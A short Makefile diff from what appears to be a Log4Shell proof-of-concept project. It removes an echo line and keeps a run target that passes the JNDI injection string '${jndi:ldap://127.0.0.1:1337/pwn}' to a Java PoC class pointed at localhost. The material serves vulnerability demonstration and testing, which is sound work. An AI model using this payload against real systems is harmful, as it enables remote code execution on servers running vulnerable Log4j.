@@ -7,7 +7,6 @@ CLASSPATH=$(subst $(SPACE),:,$(LIBS))
 
 .PHONY: run
 run: $(JARFILE)
-	echo "$${jndi:ldap://localhost:1337/pwn}"
 	java -cp $(JARFILE):$(CLASSPATH) com.trailofbits.log4shell.PoC "About to pwn" '$${jndi:ldap://127.0.0.1:1337/pwn}'
 
 .PHONY: test
